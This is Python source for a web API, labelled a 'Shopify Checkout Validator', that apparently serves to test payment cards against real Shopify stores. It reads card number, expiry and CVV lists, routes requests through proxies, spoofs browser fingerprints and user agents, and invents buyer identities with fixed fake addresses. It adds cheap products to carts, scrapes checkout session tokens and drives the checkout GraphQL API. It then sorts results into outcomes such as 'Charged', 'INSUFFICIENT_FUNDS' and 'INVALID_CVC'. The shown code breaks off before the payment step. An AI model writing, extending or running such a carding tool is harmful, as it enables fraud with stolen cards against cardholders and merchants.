"""
Shopify Checkout Validator API — v3.2 (fixed)

Endpoints:
  GET  /shopify?site=&cc=&proxy=&max_price=
  GET  /check?site=&card=&proxy=&max_price=
  GET  /health
  GET  /stats
  POST /cache/clear
  POST /reload
  GET  /
  GET  /ui

Card formats:  cc|mm|yy|cvv  or  cc|mm|yyyy|cvv
Proxy formats: ip:port | ip:port:user:pass | scheme://...

Environment variables:
  PORT              Server port (default 8080)
  WORKERS           uvicorn worker count (default 1)
  CARDS_FILE        Path to cards.txt (default ./cards.txt)
  MAX_PRICE         Max product price to target (default 100.0)
  SITE_CONCURRENCY  Max simultaneous requests per store (default 15)
  POOL_SIZE         aiohttp global connection pool (default 500)
  POOL_PER_HOST     aiohttp per-host connection limit (default 25)
  REQUEST_TIMEOUT   Full request timeout seconds (default 35)
  CACHE_TTL         Product cache TTL seconds (default 300)
  LOG_LEVEL         debug|info|warning (default warning)
  LOG_FILE          Path to requests.txt (default requests.txt)
"""

import asyncio
import copy
import datetime
import logging
import os
import random
import re
import time
from contextlib import asynccontextmanager
from typing import Any, Optional
from urllib.parse import urlparse

import aiofiles
import orjson
import uvicorn
from curl_cffi.requests import AsyncSession, RequestsError
from fastapi import Body, FastAPI, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse, Response

# ─────────────────────────────────────────────────────────────────────
# Config
# ─────────────────────────────────────────────────────────────────────
PORT             = int(os.environ.get("PORT", 8080))
WORKERS          = int(os.environ.get("WORKERS", 1))
CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
MAX_PRICE        = float(os.environ.get("MAX_PRICE", 100.0))
SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 15))
POOL_SIZE        = int(os.environ.get("POOL_SIZE", 500))
POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 25))
REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 35))
CACHE_TTL        = float(os.environ.get("CACHE_TTL", 300))
LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()
LOG_FILE         = os.environ.get("LOG_FILE", "requests.txt")

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify")


# ─────────────────────────────────────────────────────────────────────
# Logging helpers
# ─────────────────────────────────────────────────────────────────────
_log_lock = asyncio.Lock()
_SEP = "=" * 70


async def _write_log(entry: str) -> None:
    async with _log_lock:
        try:
            async with aiofiles.open(LOG_FILE, mode="a", encoding="utf-8") as f:
                await f.write(entry)
        except Exception as ex:
            log.warning("Failed to write request log: %s", ex)


def _truncate(text: str, limit: int = 3000) -> str:
    if len(text) > limit:
        return text[:limit] + f"\n... [truncated {len(text) - limit} chars]"
    return text


async def _log_incoming(request: Request, body: bytes, status_code: int,
                        elapsed_ms: float) -> None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        body_str = body.decode("utf-8", errors="replace")
    except Exception:
        body_str = "<binary>"
    entry = (
        f"\n{_SEP}\n[{now}]  INCOMING  {request.method} {request.url}\n"
        f"Client   : {request.client.host if request.client else 'unknown'}\n"
        f"Path     : {request.url.path}\n"
        f"Params   : {dict(request.query_params)}\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Response :\n{_truncate(body_str)}\n{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


async def _log_outgoing(method: str, url: str, req_body, status_code: int,
                        resp_text: str, elapsed_ms: float, label: str = "") -> None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if isinstance(req_body, bytes):
            rb = req_body.decode("utf-8", errors="replace")
        elif req_body is None:
            rb = ""
        else:
            rb = str(req_body)
    except Exception:
        rb = "<unreadable>"
    entry = (
        f"\n{_SEP}\n[{now}]  OUTGOING  {method} {url}"
        + (f"  [{label}]" if label else "") + "\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Req Body :\n{_truncate(rb, 1500)}\n"
        f"Response :\n{_truncate(resp_text, 3000)}\n{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


# ─────────────────────────────────────────────────────────────────────
# LoggedSession — thin wrapper around curl_cffi AsyncSession
# ─────────────────────────────────────────────────────────────────────
class LoggedSession:
    def __init__(self, session: AsyncSession):
        self._s = session

    async def _call(self, method: str, url: str, label: str = "",
                    data=None, json=None, **kwargs):
        t0 = time.time()
        req_body = data if data is not None else (
            orjson.dumps(json) if json is not None else None
        )
        try:
            if json is not None:
                resp = await getattr(self._s, method.lower())(url, json=json, **kwargs)
            elif data is not None:
                resp = await getattr(self._s, method.lower())(url, data=data, **kwargs)
            else:
                resp = await getattr(self._s, method.lower())(url, **kwargs)
            elapsed = (time.time() - t0) * 1000
            try:
                resp_text = resp.text
            except Exception:
                resp_text = "<unreadable>"
            asyncio.create_task(_log_outgoing(method.upper(), url, req_body,
                                              resp.status_code, resp_text,
                                              elapsed, label))
            return resp
        except Exception as exc:
            elapsed = (time.time() - t0) * 1000
            asyncio.create_task(_log_outgoing(method.upper(), url, req_body,
                                              0, f"EXCEPTION: {type(exc).__name__}: {exc}",
                                              elapsed, label))
            raise

    async def get(self, url: str, label: str = "", **kw):
        return await self._call("GET", url, label=label, **kw)

    async def post(self, url: str, label: str = "", data=None, json=None, **kw):
        return await self._call("POST", url, label=label, data=data, json=json, **kw)

    def __getattr__(self, name):
        return getattr(self._s, name)


# ─────────────────────────────────────────────────────────────────────
# Static data
# ─────────────────────────────────────────────────────────────────────
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

ADDRESS_BOOK = {
    "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",    "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
    "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",   "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London",      "postalCode": "NW1 6XE",  "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road",      "city": "Mumbai",      "postalCode": "400001",   "zoneCode": "MH",  "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa Tower","city": "Dubai",       "postalCode": "00000",    "zoneCode": "DU",  "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "88 Nathan Road",    "city": "Kowloon",     "postalCode": "000000",   "zoneCode": "KLN", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Gotthardstrasse 17","city": "Schwyz",      "postalCode": "6430",     "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",     "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",    "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",    "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",     "zoneCode": "AUK", "countryCode": "NZ", "phone": "98765432"},
    "SG": {"address1": "1 Raffles Place",   "city": "Singapore",   "postalCode": "048616",   "zoneCode": "01",  "countryCode": "SG", "phone": "61234567"},
    "JP": {"address1": "1-1 Marunouchi",    "city": "Tokyo",       "postalCode": "100-0005", "zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
    "BR": {"address1": "Av. Paulista 1000", "city": "Sao Paulo",   "postalCode": "01310-100","zoneCode": "SP",  "countryCode": "BR", "phone": "1112345678"},
    "MX": {"address1": "Paseo de la Reforma 1","city": "Mexico City","postalCode": "06600",  "zoneCode": "CMX", "countryCode": "MX", "phone": "5512345678"},
    "SE": {"address1": "Drottninggatan 1",  "city": "Stockholm",   "postalCode": "11151",    "zoneCode": "AB",  "countryCode": "SE", "phone": "812345678"},
    "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",    "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
}

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas",
               "Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen",
               "Emily","Ashley","Daniel","Matthew","Andrew","Joshua","Christopher","Ryan","Tyler"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
               "Martinez","Hernandez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Lee",
               "White","Harris","Martin","Thompson","Turner","Mitchell","Campbell","Roberts","Evans"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
                 "live.com","mail.com","aol.com"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
]


# ─────────────────────────────────────────────────────────────────────
# Global state
# ─────────────────────────────────────────────────────────────────────
_shared_session: Optional[LoggedSession] = None
_site_semaphores: dict[str, asyncio.Semaphore] = {}
_product_cache: dict[str, dict] = {}
_cards_cache: list[dict] = []
_cards_loaded_at: float = 0.0
_stats: dict[str, int] = {}


def _get_site_semaphore(hostname: str) -> asyncio.Semaphore:
    sem = _site_semaphores.get(hostname)
    if sem is None:
        sem = asyncio.Semaphore(SITE_CONCURRENCY)
        _site_semaphores[hostname] = sem
    return sem


def _stat_inc(key: str) -> None:
    _stats[key] = _stats.get(key, 0) + 1


# ─────────────────────────────────────────────────────────────────────
# Lifespan — single app, single source of truth
# ─────────────────────────────────────────────────────────────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    global _shared_session
    _shared_session = LoggedSession(
        AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT)
    )
    _reload_cards()
    log.warning("Shopify Validator API started pool=%d host=%d concurrency=%d/site",
                POOL_SIZE, POOL_PER_HOST, SITE_CONCURRENCY)
    yield
    if _shared_session:
        r = _shared_session.close()
        if asyncio.iscoroutine(r):
            await r


app = FastAPI(title="Shopify Validator", version="3.2.0", lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# ─────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────
def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache = _load_cards_from_file()
    _cards_loaded_at = time.time()


def _load_cards_from_file() -> list[dict]:
    cards = []
    if not os.path.exists(CARDS_FILE):
        return cards
    with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            card = _parse_card(line.strip())
            if card:
                cards.append(card)
    return cards


def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache


def _parse_card(raw: str) -> Optional[dict]:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2 or not 1 <= int(mon) <= 12:
        return None
    if not 13 <= len(cc_num) <= 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}


def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if "://" in s:
        return s
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    return None


def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    netloc = urlparse(url).netloc.split(":")[0]
    tld = netloc.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in ADDRESS_BOOK:
            return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]


def _random_identity() -> tuple[str, str, str]:
    first = random.choice(FIRST_NAMES)
    last  = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


def _extract(text: str, start: str, end: str) -> Optional[str]:
    i = text.find(start)
    if i == -1:
        return None
    sub = text[i + len(start):]
    j = sub.find(end)
    if j == -1:
        return None
    val = sub[:j]
    return val if val else None


def _extract_sst(text: str, headers: dict) -> Optional[str]:
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"', '"'),
        ('"sessionToken":"', '"'),
        ("sessionToken&quot;:&quot;", "&quot;"),
        ('data-session-token="', '"'),
        ('"checkout_session_token":"', '"'),
    ]
    for s, e in patterns:
        v = _extract(text, s, e)
        if v and len(v) > 10:
            return v
    return None


def _normalize_response(raw: Optional[str]) -> str:
    if not raw:
        return "CARD_DECLINED"
    m = str(raw).upper()
    if any(k in m for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED")):
        return "ORDER_PLACED"
    if any(k in m for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
                            "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
                            "AUTHENTICATION_REQUIRED", "THREEDSSECURE",
                            "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED")):
        return "3DS_REQUIRED"
    if any(k in m for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
                            "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
                            "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in m for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "DO_NOT_HONOR",
                            "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in m for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
        return "EXPIRED_CARD"
    if any(k in m for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                            "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
                            "CARD_NOT_SUPPORTED")):
        return "INVALID_CARD"
    if any(k in m for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA",
                            "BOT_DETECTION", "CHALLENGE_REQUIRED")):
        return "CAPTCHA_REQUIRED"
    return "CARD_DECLINED"


def _parse_gql_errors(errors: list) -> str:
    for err in errors:
        for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                    "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(fld) or "")
            if not raw:
                continue
            norm = _normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm
            upper = raw.upper()
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                                        "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED"
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED", "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN"
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
                                        "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT"
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
                                        "RATE_LIMITED", "RETRY_LATER")):
                return "THROTTLED"
    return "GRAPHQL_ERROR"


def _make_session(proxy_str: Optional[str]) -> tuple[LoggedSession, bool]:
    """Return (session, owned). Reuses global pooled session when no proxy."""
    proxy = _parse_proxy(proxy_str) if proxy_str else None
    if proxy:
        proxies = {"http": proxy, "https": proxy}
        return LoggedSession(
            AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT, proxies=proxies)
        ), True
    return _shared_session, False


# ─────────────────────────────────────────────────────────────────────
# Product fetching (with TTL cache)
# ─────────────────────────────────────────────────────────────────────
async def _fetch_products(base_url: str, proxy_str: Optional[str] = None,
                          max_price: float = MAX_PRICE
                          ) -> tuple[Optional[dict], list[dict], Optional[str]]:
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    hostname = urlparse(base_url).netloc
    now = time.time()

    cached = _product_cache.get(hostname)
    if cached and (now - cached["ts"]) < CACHE_TTL:
        return cached["product"], cached["candidates"], cached["err"]

    session, owned = _make_session(proxy_str)
    try:
        variants: list[dict] = []
        for url in (f"{base_url}/products.json?limit=250&sort_by=price-ascending",
                    f"{base_url}/products.json?limit=250"):
            try:
                r = await session.get(url, allow_redirects=True)
                if r.status_code == 200:
                    data = orjson.loads(r.content)
                    if data.get("products"):
                        variants = data["products"]
                        break
                elif r.status_code in (429, 430):
                    err = "THROTTLED"
                    _product_cache[hostname] = {"product": None, "candidates": [],
                                                "err": err, "ts": now}
                    return None, [], err
            except Exception:
                continue

        candidates: list[dict] = []
        best, best_price = None, float("inf")

        if not variants:
            err = "No products found"
            _product_cache[hostname] = {"product": None, "candidates": [],
                                        "err": err, "ts": now}
            return None, [], err

        for p in variants:
            for v in p.get("variants", []):
                try:
                    if v.get("available") is False:
                        continue
                    price = float(v.get("price") or "0")
                except (ValueError, TypeError):
                    continue
                if price <= 0 or price > max_price:
                    continue
                entry = {
                    "site":       base_url,
                    "price":      f"{price:.2f}",
                    "price_f":    price,
                    "variant_id": str(v["id"]),
                    "title":      p.get("title", "Product"),
                    "handle":     p.get("handle", ""),
                }
                candidates.append(entry)
                if price < best_price:
                    best_price, best = price, entry

        if not best:
            err = f"No products under ${max_price:.2f}"
            _product_cache[hostname] = {"product": None, "candidates": [],
                                        "err": err, "ts": now}
            return None, [], err

        _product_cache[hostname] = {"product": best, "candidates": candidates,
                                    "err": None, "ts": now}
        return best, candidates, None

    except (asyncio.TimeoutError, RequestsError):
        return None, [], "Timeout"
    except Exception as ex:
        return None, [], str(ex)
    finally:
        if owned:
            r = session.close()
            if asyncio.iscoroutine(r):
                await r


# ─────────────────────────────────────────────────────────────────────
# GraphQL queries (persisted — real Shopify endpoints)
# ─────────────────────────────────────────────────────────────────────
_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "__typename}__typename}__typename}"
)


# ─────────────────────────────────────────────────────────────────────
# Core validator
# ─────────────────────────────────────────────────────────────────────
async def validate_card(
    cc: str, month: str, year: str, cvv: str, site_url: str,
    variant_id: Optional[str] = None,
    proxy_str: Optional[str] = None,
    max_price: Optional[float] = None,
) -> dict:
    t0 = time.time()
    gateway = "UNKNOWN"
    price = "0.00"
    currency = "USD"
    product_title = ""
    effective_max_price = max_price if max_price is not None else MAX_PRICE

    site_url = site_url.strip()
    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc
    ua = random.choice(USER_AGENTS)

    def _r(response: str, charged: str = "False", approved: str = "False") -> dict:
        return {
            "Response": response,
            "CC":       f"{cc}|{month}|{year}|{cvv}",
            "Product":  product_title,
            "Price":    price,
            "Gate":     gateway,
            "Site":     ourl,
            "Charged":  charged,
            "Approved": approved,
            "Time":     f"{round(time.time() - t0, 2)}s",
        }

    sem = _get_site_semaphore(hostname)
    session, owned = _make_session(proxy_str)

    async with sem:
        try:
            addr = _pick_address(ourl)
            country_code = addr["countryCode"]
            first, last, email = _random_identity()
            phone  = addr["phone"]
            street = addr["address1"]
            city   = addr["city"]
            state  = addr["zoneCode"]
            s_zip  = addr["postalCode"]

            best, all_candidates, err = await _fetch_products(ourl, proxy_str)
            candidates_under_max = [c for c in all_candidates
                                    if float(c.get("price", 999999)) <= effective_max_price]

            if not variant_id:
                if not candidates_under_max:
                    return _r(f"NO_PRODUCT: {err or f'No products under ${effective_max_price:.2f}'}")
                chosen = random.choice(candidates_under_max)
                variant_id    = chosen["variant_id"]
                price         = chosen["price"]
                product_title = chosen.get("title", "")
            else:
                matched = next(
                    (c for c in (all_candidates or [])
                     if str(c.get("variant_id")) == str(variant_id)), None,
                )
                if not matched:
                    return _r(f"PRICE_OVER_MAX: variant {variant_id} unavailable")
                price         = matched["price"]
                product_title = matched.get("title", "")

            try:
                if float(price) > effective_max_price:
                    return _r(f"PRICE_OVER_MAX: base price ${price} > ${effective_max_price:.2f}")
            except (ValueError, TypeError):
                pass

            base_headers = {
                "User-Agent":         ua,
                "Accept":             "application/json, text/plain, */*",
                "Accept-Language":    "en-US,en;q=0.9",
                "Content-Type":       "application/json",
                "Origin":             ourl,
                "Referer":            f"{ourl}/",
                "sec-ch-ua":          '"Chromium";v="136", "Not-A.Brand";v="24"',
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
            }

            # ── 1. cart add ────────────────────────────────────────
            cart_added = False
            for payload, ct in (
                (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
                (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                 "application/json"),
            ):
                try:
                    r = await session.post(
                        f"{ourl}/cart/add.js",
                        data=payload,
                        headers={**base_headers, "Content-Type": ct,
                                 "Accept": "application/json"},
                    )
                    if r.status_code == 200:
                        cart_added = True
                        break
                except Exception:
                    continue

            if not cart_added:
                return _r("CART_FAILED")

            # ── 2. checkout page ───────────────────────────────────
            try:
                cr = await session.post(
                    f"{ourl}/checkout/",
                    allow_redirects=True,
                    headers={**base_headers,
                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                )
                checkout_url = str(cr.url)
                page_text    = cr.text
            except (asyncio.TimeoutError, RequestsError):
                return _r("TIMEOUT")
            except Exception as ex:
                return _r(f"CHECKOUT_FAILED: {type(ex).__name__}")

            lower_url = checkout_url.lower()
            if any(k in lower_url for k in ("login", "/account", "password")):
                return _r("SITE_REQUIRES_LOGIN")

            m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
            attempt_token = (m.group(1) if m
                             else checkout_url.rstrip("/").split("/")[-1].split("?")[0])
            if not attempt_token or len(attempt_token) < 4:
                return _r("NO_ATTEMPT_TOKEN")

            sst = _extract_sst(page_text, dict(cr.headers))
            if not sst:
                return _r("NO_SESSION_TOKEN")

            queue_token = (
                _extract(page_text, "queueToken&quot;:&quot;", "&quot;")
                or _extract(page_text, '"queueToken":"', '"')
            )
            stable_id = (
                _extract(page_text, "stableId&quot;:&quot;", "&quot;")
                or _extract(page_text, '"stableId":"', '"')
                or "1"
            )
            merch_gid = (
                _extract(page_text, "ProductVariantMerchandise/", "&quot;")
                or _extract(page_text, "ProductVariantMerchandise/", "&q")
                or _extract(page_text,
                            '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
                or str(variant_id)
            )

            for s, e in (("currencyCode&quot;:&quot;", "&quot;"),
                         ('"currencyCode":"', '"')):
                v = _extract(page_text, s, e)
                if v and len(v) == 3 and v.isalpha():
                    currency = v.upper()
                    break

            addr = _pick_address(ourl, currency)
            country_code = addr["countryCode"]
            phone  = addr["phone"]
            street = addr["address1"]
            city   = addr["city"]
            state  = addr["zoneCode"]
            s_zip  = addr["postalCode"]

            subtotal = (
                _extract(page_text,
                         "subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;",
                         "&quot;")
                or _extract(page_text,
                            '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                subtotal = m2.group(1) if m2 else "0.01"

            unescaped = page_text.replace("&quot;", '"').replace("&amp;", "&")
            build_id  = None
            m3 = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m3:
                build_id = m3.group(1)

            source_token = _extract(page_text,
                                    'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            graphql_url = f"https://{hostname}/checkouts/unstable/graphql"
            gql_headers = {
                **base_headers,
                "shopify-checkout-client":      "checkout-web/1.0",
                "shopify-checkout-source":      f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "x-checkout-web-deploy-stage":  "canary",
                "sec-fetch-dest":               "empty",
                "sec-fetch-mode":               "cors",
                "sec-fetch-site":               "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"] = build_id
            if source_token:
                gql_headers["x-checkout-web-source-id"] = source_token

            # ── 3. shipping proposal (raw GraphQL — small query) ───
            merch_id_full   = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
            variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

            def _base_vars() -> dict:
                return {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken":   queue_token or "",
                    "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": first, "lastName": last,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments":              {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"any": True},
                            "destinationChanged":     True,
                        }],
                        "noDeliveryRequired":            [],
                        "useProgressiveRates":           False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping":         True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId":   stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id":                merch_id_full,
                                    "variantId":         variant_id_full,
                                    "properties":        [],
                                    "sellingPlanId":     None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity":           {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal,
                                                             "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents":       [],
                        }]
                    },
                    "payment": {
                        "totalAmount":  {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "", "countryCode": country_code,
                                "lastName": "", "zoneCode": state, "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer":          {"presentmentCurrency": currency,
                                              "countryCode":       country_code},
                        "email":             email,
                        "emailChanged":      False,
                        "phoneCountryCode":  country_code,
                        "marketingConsent":  [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe":        False,
                    },
                    "tip":    {"tipLines": []},
                    "taxes":  {
                        "proposedAllocations":          None,
                        "proposedTotalAmount":          {"value": {"amount": "0",
                                                                   "currencyCode": currency}},
                        "proposedTotalIncludedAmount":  None,
                        "proposedMixedStateTotalAmount":None,
                        "proposedExemptions":           [],
                    },
                    "note":   {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms":    None,
                    "scriptFingerprint": {
                        "signature":             None,
                        "signatureUuid":         None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges":  [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties":       {"buyerRefusesDuties": False},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "memberships":          {"memberships": []},
                    "cartMetafields":       [],
                }

            # Minimal shipping query (avoid full fragments)
